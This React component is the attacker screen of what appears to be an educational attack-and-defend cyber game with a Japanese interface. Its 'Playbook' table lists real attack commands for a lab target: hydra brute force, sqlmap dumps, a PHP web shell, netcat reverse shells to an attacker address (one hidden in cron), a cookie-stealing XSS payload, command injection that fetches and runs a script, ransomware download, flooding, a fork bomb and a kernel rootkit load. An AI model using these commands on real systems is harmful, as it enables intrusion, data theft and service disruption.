import { useState, useEffect, useRef } from 'react';
import { Socket } from 'socket.io-client';
import { useLocation, useNavigate } from 'react-router-dom';
import { Terminal } from '@xterm/xterm';
import { FitAddon } from '@xterm/addon-fit';
import '@xterm/xterm/css/xterm.css';

interface AttackerProps {
    socket: Socket | null;
}

type GamePhase = 'WAITING' | 'SELECTING_IP' | 'DISCOVERING' | 'IDLE' | 'ATTACKING' | 'ATTACK_SUCCESS' | 'BLOCKED' | 'COMPLETED';

const ATTACKS = [
    { id: 'ssh', name: 'SSHブルートフォース', desc: '辞書攻撃でSSHパスワードを突破' },
    { id: 'sqli', name: 'Web SQLインジェクション', desc: 'DB情報をダンプ' },
    { id: 'ddos', name: 'HTTP DDoS攻撃 (Web Flood)', desc: '大量リクエストでサーバー過負荷' },
    { id: 'ransomware', name: 'ランサムウェア攻撃', desc: '重要ファイルの暗号化' },
    { id: 'rce', name: 'RCE (Remote Code Execution)', desc: 'Web脆弱性を突き任意のコード実行' },
    { id: 'xss', name: 'XSSセッションハイジャック', desc: '管理者セッション奪取' },
    { id: 'oscmd', name: 'OS Command Injection', desc: '入力フォーム経由でシェルの実行' },
    { id: 'ftp', name: 'FTPマルウェア配置', desc: '匿名ログインから不正ファイル設置' },
    { id: 'nmap', name: '内部ネットワーク・ポートスキャン', desc: '踏み台からの内部調査' },
    { id: 'privesc', name: '権限昇格 (Privilege Escalation)', desc: 'root権限の奪取' },
    { id: 'synflood', name: 'SYN Flood攻撃', desc: 'TCPコネクション枯渇' },
    { id: 'dnsamp', name: 'DNS Reflection', desc: 'UDP増幅・帯域圧迫' },
    { id: 'forkbomb', name: 'Fork Bomb (OOM)', desc: 'プロセス無限増殖でリソース枯渇' },
    { id: 'slowloris', name: 'Slowloris', desc: 'ファイルディスクリプタ(FD)枯渇' },
    { id: 'cron', name: 'Cronバックドア（永続化）', desc: '定期実行ジョブに不正シェル埋め込み' },
    { id: 'sshkey', name: 'SSH Authorized_keys', desc: '公開鍵追記による永続的なバックドア' },
    { id: 'rootkit', name: 'LKM Rootkit', desc: 'マルウェアのプロセスやポートをカーネルレベルで隠蔽' },
];

const ATTACK_STEPS: Record<string, string[]> = {
    'ssh': ['nmap -p 22 192.168.1.100', 'hydra -l admin -P pass.txt ssh://192.168.1.100', 'ssh admin@192.168.1.100'],
    'sqli': ['nmap -p 80 192.168.1.100', 'curl http://192.168.1.100/login', 'sqlmap -u "http://192.168.1.100/login?id=1" --dbs', 'sqlmap -u "..." -D public --dump'],
    'ddos': ['nmap -p 80 192.168.1.100', 'ping -c 1 192.168.1.100', 'slowhttptest -c 1000 -u http://192.168.1.100', 'ab -n 10000 -c 1000 http://192.168.1.100/'],
    'ransomware': ['nmap -p 22 192.168.1.100', 'hydra -l root -P pass.txt ssh://192.168.1.100', 'ssh root@192.168.1.100', 'wget http://10.0.0.5/ransomware.elf', './ransomware.elf'],
    'rce': ['nmap -p 80 192.168.1.100', 'nikto -h http://192.168.1.100', 'curl -X POST http://192.168.1.100/upload -d "<?php system($_GET[\'cmd\']); ?>"', 'curl "http://192.168.1.100/upload/shell.php?cmd=nc -e /bin/bash 192.168.1.10 4444"'],
    'xss': ['nmap -p 80 192.168.1.100', 'curl -X POST http://192.168.1.100/comment -d "<script>fetch(\'http://192.168.1.10/log?cookie=\'+document.cookie)</script>"', 'nc -lvnp 80', 'curl -H "Cookie: session_id=admin_token" http://192.168.1.100/admin'],
    'oscmd': ['nmap -p 80 192.168.1.100', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;id"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;wget http://192.168.1.10/bd.sh"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;bash bd.sh"'],
    'ftp': ['nmap -p 21 192.168.1.100', 'ftp 192.168.1.100', 'put malware.exe', 'site exec malware.exe'],
    'nmap': ['nmap -p 22 192.168.1.100', 'hydra -l target -P pass.txt ssh://192.168.1.100', 'ssh target@192.168.1.100', 'nmap -sn 10.0.0.0/24', 'nmap -p- 10.0.0.5'],
    'privesc': ['nmap -p 22 192.168.1.100', 'hydra -l user -P pass.txt ssh://192.168.1.100', 'ssh user@192.168.1.100', 'sudo -l', 'sudo /bin/bash'],
    'synflood': ['nmap -p 80 192.168.1.100', 'hping3 -S --flood -V -p 80 192.168.1.100'],
    'dnsamp': ['nmap -sU -p 53 8.8.8.8', 'nmap -sU -p 53 --script=dns-recursion 8.8.8.8', 'hping3 -q -n -a 192.168.1.100 --udp -p 53 8.8.8.8'],
    'forkbomb': ['nmap -p 22 192.168.1.100', 'hydra -l user -P pass.txt ssh://192.168.1.100', 'ssh user@192.168.1.100', ':(){ :|:& };:'],
    'slowloris': ['nmap -p 80 192.168.1.100', 'slowloris 192.168.1.100'],
    'cron': ['nmap -p 22 192.168.1.100', 'hydra -l root -P pass.txt ssh://192.168.1.100', 'ssh root@192.168.1.100', 'echo "* * * * * nc -e /bin/bash 192.168.1.10 4444" > /tmp/cronjob', 'crontab /tmp/cronjob'],
    'sshkey': ['nmap -p 22 192.168.1.100', 'ssh-keygen -t rsa -f mykey', 'scp mykey.pub root@192.168.1.100:/root/.ssh/authorized_keys'],
    'rootkit': ['nmap -p 22 192.168.1.100', 'hydra -l root -P pass.txt ssh://192.168.1.100', 'ssh root@192.168.1.100', 'git clone https://github.com/mfontanini/diamorphine', 'cd diamorphine && make', 'insmod diamorphine.ko'],
};

export function Attacker({ socket }: AttackerProps) {
    const navigate = useNavigate();
    const location = useLocation();
    const roomId = new URLSearchParams(location.search).get('room') || 'UNKNOWN_ROOM';

    const [phase, setPhase] = useState<GamePhase>('WAITING');
    const [targetIp, setTargetIp] = useState<string>('192.168.1.100');
    const [availableIps, setAvailableIps] = useState<string[]>([]);
    const [scanResults, setScanResults] = useState<Record<string, 'scanning' | 'up' | 'down'>>({});
    const [selectedAttack, setSelectedAttack] = useState<string>('ssh');
    const [isBlocked, setIsBlocked] = useState(false);
    const [winner, setWinner] = useState<'attacker' | 'defender' | null>(null);

    const terminalRef = useRef<HTMLDivElement>(null);
    const xtermRef = useRef<Terminal | null>(null);
    const fitAddonRef = useRef<FitAddon | null>(null);
    const isXtermInitialized = useRef(false);

    const writeXterm = (text: string, colorCode: string = '') => {
        if (!xtermRef.current) return;
        const textStr = colorCode ? `\x1b[${colorCode}m${text}\x1b[0m` : text;
        const lines = textStr.split('\n');
        lines.forEach((line, i) => {
            xtermRef.current?.write(line + (i < lines.length - 1 ? '\r\n' : ''));
        });
    };

    // xterm 初期化
    useEffect(() => {
        if (isXtermInitialized.current || !terminalRef.current) return;
        isXtermInitialized.current = true;

        const term = new Terminal({
            cursorBlink: true,
            theme: {
                background: '#0a0a0a',
                foreground: '#00ffcc', // Hacker green/cyan
            }
        });
        const fitAddon = new FitAddon();
        term.loadAddon(fitAddon);
        term.open(terminalRef.current);
        fitAddon.fit();

        xtermRef.current = term;
        fitAddonRef.current = fitAddon;

        term.onData(data => {
            if (socket) socket.emit('pty_input', { input: data });
        });

        const resizeObserver = new ResizeObserver(() => {
            if (fitAddonRef.current && xtermRef.current) {
                fitAddonRef.current.fit();
                if (socket) {
                    socket.emit('pty_resize', { cols: term.cols, rows: term.rows });
                }
            }
        });
        resizeObserver.observe(terminalRef.current);

        return () => {
            resizeObserver.disconnect();
            term.dispose();
            isXtermInitialized.current = false;
        };
    }, [socket]);

    // Socket イベントリスナー
    useEffect(() => {
        if (!socket) {
            navigate('/');
            return;
        }

        socket.emit('join_room', { roomId, role: 'ATTACKER' });

        socket.on('disconnect', () => {
            // Handle disconnect
        });

        socket.on('attacker_pty_output', (data) => {
            xtermRef.current?.write(data.output);
        });

        socket.on('game_state', (data) => {
            setPhase(data.phase);
            if (data.availableTargetIps) setAvailableIps(data.availableTargetIps);
            if (data.targetIp) setTargetIp(data.targetIp);

            setIsBlocked(data.phase === 'BLOCKED');
            if (data.phase === 'WAITING') {
                writeXterm('\r\n[!] ターゲットへの接続待機中...\r\n', '35');
            } else if (data.phase === 'SELECTING_IP') {
                writeXterm('\r\n[!] 防御側がターゲットIPを設定しています...\r\n', '35');
            } else if (data.phase === 'DISCOVERING') {
                writeXterm('\r\n[!] ターゲットネットワークへの侵入に成功。IPアドレスをスキャンして特定してください。\r\n', '33');
            } else if (data.phase === 'IDLE') {
                writeXterm(`\r\n[!] ターゲット(${data.targetIp})への経路が確認されました。攻撃を選択してください。\r\n`, '32');
            }
        });

        socket.on('scan_result', (data) => {
            setScanResults(prev => ({ ...prev, [data.ip]: data.success ? 'up' : 'down' }));
            if (data.success) {
                writeXterm(`\r\n[+] SCAN SUCCESS: Host ${data.ip} is UP.\r\n`, '32');
                setTargetIp(data.ip);
            } else {
                writeXterm(`\r\n[-] SCAN FAILED: Host ${data.ip} is down or unreachable.\r\n`, '31');
            }
        });

        socket.on('start_discovery', (data) => {
            writeXterm(`\r\n[*] ${data.message}\r\n`, '33');
        });

        socket.on('attack_started', (data) => {
            setPhase('ATTACKING');
            writeXterm(`\r\n\r\n[+] 攻撃フェーズ開始: ${data.attackName}\r\n`, '32');
            writeXterm(`[*] ${data.detail}\r\n`, '33');
            writeXterm(`[*] 右パネルの手順書（Playbook）に従い、コマンドを入力して攻撃を進行させてください。\r\n\r\n`, '33');
        });

        socket.on('exploit_success', (data) => {
            setPhase('COMPLETED');
            writeXterm(`\r\n[+] ${data.message}\r\n`, '32');
        });

        socket.on('game_clear', (data) => {
            setPhase('COMPLETED');
            setWinner(data.winner);
            if (data.winner === 'attacker') {
                writeXterm(`\r\n\r\n╔══════════════════════════════════════════════════════╗\r\n║  🔥 MISSION COMPLETE - SYSTEM COMPROMISED 🔥          ║\r\n║  ${data.message}  ║\r\n╚══════════════════════════════════════════════════════╝\r\n`, '32');
            } else {
                writeXterm(`\r\n\r\n╔══════════════════════════════════════════════════════╗\r\n║  ❌ MISSION FAILED - ATTACK BLOCKED       ❌          ║\r\n║  ${data.message}  ║\r\n╚══════════════════════════════════════════════════════╝\r\n`, '31');
            }
        });

        socket.on('force_logout', (data) => {
            setIsBlocked(true);
            writeXterm(`\r\n\r\n[!] FATAL ERROR: ${data.reason}\r\n[!] すべての接続が切断されました。\r\n`, '31');
        });

        socket.on('blocked', () => {
            setIsBlocked(true);
            writeXterm(`\r\n[!] Connection refused: このIPはブロックされています。\r\n`, '31');
        });

        socket.on('game_reset', () => {
            xtermRef.current?.clear();
            setPhase('IDLE');
            setIsBlocked(false);
            setWinner(null);
            writeXterm('\r\nシステムリセット完了。新しいセッションを開始できます。\r\n', '35');
        });

        return () => {
            socket.off('attacker_pty_output');
            socket.off('game_state');
            socket.off('scan_result');
            socket.off('start_discovery');
            socket.off('attack_started');
            socket.off('game_clear');
            socket.off('force_logout');
            socket.off('blocked');
            socket.off('game_reset');
            socket.off('disconnect');
        };
    }, [socket, phase, roomId, navigate]);

    // ─── フェーズごとのアクション ───────────────────────────

    const handleScan = (ip: string) => {
        if (!socket || phase !== 'DISCOVERING' || scanResults[ip]) return;
        setScanResults(prev => ({ ...prev, [ip]: 'scanning' }));
        socket.emit('scan_target_ip', { ip });
    };

    const handleStartAttack = () => {
        if (!socket) return;
        setPhase('ATTACKING');
        socket.emit('start_attack', { attackType: selectedAttack });
        // After starting, focus terminal so they can start typing
        setTimeout(() => xtermRef.current?.focus(), 100);
    };

    const handleExecuteExploit = () => {
        if (!socket) return;
        setPhase('COMPLETED');
        socket.emit('execute_exploit');
    };

    const handleReset = () => {
        if (!socket) return;
        socket.emit('reset_game');
    };

    // ─── UI ────────────────────────────────────────────────────

    return (
        <div className="min-h-screen bg-black text-green-400 font-mono flex flex-col relative w-full h-full">
            {(phase === 'WAITING' || phase === 'SELECTING_IP') && (
                <div className="absolute inset-0 bg-[#0a0f12]/95 z-50 text-[#00ffcc] font-mono flex flex-col items-center justify-center p-8 backdrop-blur-sm">
                    <div className="text-2xl mb-4 font-bold animate-pulse text-red-500">
                        ATTACK SQUAD - {phase === 'WAITING' ? 'Waiting for Target' : 'Target Setup'}
                    </div>
                    <div className="text-slate-400 mb-8">
                        {phase === 'WAITING' ? `Room: ${roomId} に防御側が参加するのを待機しています...` : '防御側がターゲットIPを設定しています...'}
                    </div>
                    <button
                        onClick={() => navigate('/')}
                        className="px-6 py-2 border border-red-900/50 bg-red-950/20 hover:bg-red-900/50 text-red-500 rounded transition-colors"
                    >
                        Leave Room
                    </button>
                </div>
            )}
            {phase === 'DISCOVERING' && (
                <div className="absolute inset-0 top-12 bg-black/95 z-40 text-green-400 font-mono flex flex-col items-center justify-center p-8 backdrop-blur-md">
                    <div className="text-2xl mb-4 font-bold text-green-500">TARGET DISCOVERY</div>
                    <div className="text-slate-400 mb-8 max-w-2xl text-center">
                        ターゲットネットワークへの境界侵入に成功しました。<br />
                        以下のIPアドレスをスキャンし、ターゲットサーバー（防御側）を特定してください。
                    </div>
                    <div className="grid grid-cols-2 md:grid-cols-5 gap-4 max-w-4xl w-full">
                        {availableIps.map(ip => (
                            <button
                                key={ip}
                                onClick={() => handleScan(ip)}
                                disabled={scanResults[ip] === 'scanning' || scanResults[ip] === 'up'}
                                className={`px-4 py-6 border rounded font-mono transition-all flex flex-col items-center justify-center shadow-lg hover:-translate-y-1 ${scanResults[ip] === 'up'
                                    ? 'bg-green-900 border-green-500 text-green-300'
                                    : scanResults[ip] === 'down'
                                        ? 'bg-red-950/30 border-red-900/50 text-slate-500 line-through opacity-70'
                                        : scanResults[ip] === 'scanning'
                                            ? 'bg-yellow-950 border-yellow-700 text-yellow-500 animate-pulse'
                                            : 'bg-slate-900 border-slate-700 hover:border-green-500 text-green-500 hover:bg-slate-800'
                                    }`}
                            >
                                <span className={scanResults[ip] === 'up' ? 'font-bold' : ''}>{ip}</span>
                                {scanResults[ip] === 'scanning' && <span className="text-[10px] mt-2 tracking-widest text-yellow-500">SCANNING</span>}
                                {scanResults[ip] === 'up' && <span className="text-[10px] mt-2 font-bold animate-pulse text-green-300 tracking-wider">TARGET FOUND</span>}
                                {scanResults[ip] === 'down' && <span className="text-[10px] mt-2 text-slate-600 tracking-wider">OFFLINE</span>}
                            </button>
                        ))}
                    </div>
                </div>
            )}
            {/* ヘッダー */}
            <div className="flex items-center justify-between px-4 py-2 bg-slate-900 border-b border-green-900/50">
                <div className="flex items-center gap-3">
                    <span className="text-red-500 font-bold">▶ attacker@kali</span>
                    <span className="text-slate-500 text-xs">10.0.0.5</span>
                    <span className={`text-xs px-2 py-0.5 rounded-full font-bold ${isBlocked ? 'bg-red-900 text-red-300' :
                        phase === 'COMPLETED' ? (winner === 'attacker' ? 'bg-green-900 text-green-300' : 'bg-red-900 text-red-300') :
                            phase !== 'IDLE' ? 'bg-yellow-900 text-yellow-300 animate-pulse' :
                                'bg-slate-800 text-slate-400'
                        }`}>
                        {isBlocked ? '🚫 BLOCKED' :
                            phase === 'COMPLETED' ? (winner === 'attacker' ? '🏆 YOU WIN' : '💀 YOU LOSE') :
                                phase === 'ATTACKING' ? '⚡ ATTACKING...' : '⬤ IDLE'}
                    </span>
                </div>
                <div className="flex items-center gap-4">
                    <div className="bg-red-950/40 border border-red-900/50 px-4 py-1 rounded text-sm text-red-300 font-mono">
                        ROOM: {roomId}
                    </div>
                </div>
                <div className="flex gap-2">
                    <button onClick={() => navigate('/')} className="text-slate-500 hover:text-white text-xs border border-slate-700 px-2 py-1 rounded">← Back</button>
                    <button onClick={handleReset} className="text-slate-500 hover:text-red-400 text-xs border border-slate-700 px-2 py-1 rounded">Reset</button>
                </div>
            </div>

            {/* ターミナル */}
            <div className="flex flex-1 gap-0">
                {/* メインターミナル */}
                <div className="flex-1 flex flex-col">
                    <div className="bg-slate-900/30 px-3 py-1 text-xs text-slate-500 border-b border-slate-800">
                        Terminal — bash — 120×40
                    </div>
                    <div className="flex-1 p-4 bg-[#0a0a0a]" style={{ minHeight: 'calc(100vh - 120px)' }}>
                        <div ref={terminalRef} className="w-full h-full" style={{ overflow: 'hidden' }} />
                    </div>
                </div>

                {/* 右サイドパネル */}
                <div className="w-56 bg-slate-950 border-l border-slate-800 flex flex-col">
                    <div className="px-3 py-2 bg-slate-900 text-xs text-slate-500 border-b border-slate-800">
                        攻撃フェーズ
                    </div>
                    <div className="flex-1 p-3 space-y-2 flex flex-col h-full">
                        <div className="flex-1 overflow-y-auto pr-1">
                            <div className="text-xs text-slate-400 mb-2">攻撃シナリオを選択:</div>
                            <div className="space-y-1.5 focus:outline-none">
                                {ATTACKS.map(a => (
                                    <button
                                        key={a.id}
                                        onClick={() => setSelectedAttack(a.id)}
                                        disabled={phase !== 'IDLE'}
                                        className={`w-full text-left p-2 rounded border transition-colors ${selectedAttack === a.id ? 'bg-green-950/40 border-green-700' : 'bg-slate-900/50 border-slate-800 hover:border-slate-600'} ${phase !== 'IDLE' ? 'opacity-50 cursor-not-allowed' : ''}`}
                                    >
                                        <div className={`text-xs font-bold ${selectedAttack === a.id ? 'text-green-400' : 'text-slate-300'}`}>{a.name}</div>
                                        <div className="text-[10px] text-slate-500 mt-0.5 truncate">{a.desc}</div>
                                    </button>
                                ))}
                            </div>
                        </div>

                        <div className="pt-2 border-t border-slate-800 mt-2">
                            {phase === 'IDLE' ? (
                                <button
                                    onClick={handleStartAttack}
                                    disabled={phase !== 'IDLE' || isBlocked}
                                    className="w-full text-xs font-bold bg-red-950 hover:bg-red-900 border border-red-900 text-red-400 py-2 rounded transition-colors"
                                >
                                    ▶ 攻撃を開始
                                </button>
                            ) : (
                                <div className="p-3 bg-red-950/20 border border-red-900/50 rounded flex flex-col h-full">
                                    <h3 className="text-red-400 font-bold text-xs mb-2">🔥 Playbook (実行手順)</h3>
                                    <div className="text-slate-300 text-[10px] mb-3 leading-relaxed">
                                        以下のコマンドを順番にターミナルに入力し、防衛側より早く攻撃を完了させてください！
                                    </div>
                                    <div className="space-y-2 flex-grow overflow-y-auto">
                                        {ATTACK_STEPS[selectedAttack]?.map((cmd, i) => {
                                            const actualCmd = cmd.replace(/192\.168\.1\.100/g, targetIp);
                                            return (
                                                <div key={i} className="bg-black border border-slate-800 p-2 rounded relative group">
                                                    <div className="text-slate-500 text-[9px] mb-1">Step {i + 1}</div>
                                                    <code className="text-green-400 text-[10px] break-all">{actualCmd}</code>
                                                </div>
                                            );
                                        })}
                                    </div>
                                    {phase === 'ATTACKING' && (
                                        <button
                                            onClick={handleExecuteExploit}
                                            className="w-full mt-4 text-xs font-bold bg-green-950 hover:bg-green-900 border border-green-900 text-green-400 py-2 rounded transition-colors"
                                        >
                                            🚀 エクスプロイト実行（攻撃完了）
                                        </button>
                                    )}
                                </div>
                            )}

                            {phase === 'COMPLETED' && (
                                <div className={`text-center text-xs mt-3 p-2 border rounded font-bold ${winner === 'attacker' ? 'bg-green-950/50 border-green-900 text-green-400' : 'bg-red-950/50 border-red-900 text-red-400'}`}>
                                    {winner === 'attacker' ? '🏆 攻撃完遂 (勝利)' : '💀 攻撃失敗 (敗北)'}
                                </div>
                            )}
                        </div>
                    </div>

                    {/* ターゲット情報 */}
                    <div className="p-3 border-t border-slate-800 text-xs text-slate-500 space-y-1">
                        <div>Target: <span className="text-green-500">{phase === 'WAITING' || phase === 'SELECTING_IP' || phase === 'DISCOVERING' ? '???' : targetIp}</span></div>
                        <div>Port: <span className="text-green-500">22/ssh, 80/http</span></div>
                    </div>
                </div>
            </div>
        </div>
    );
}
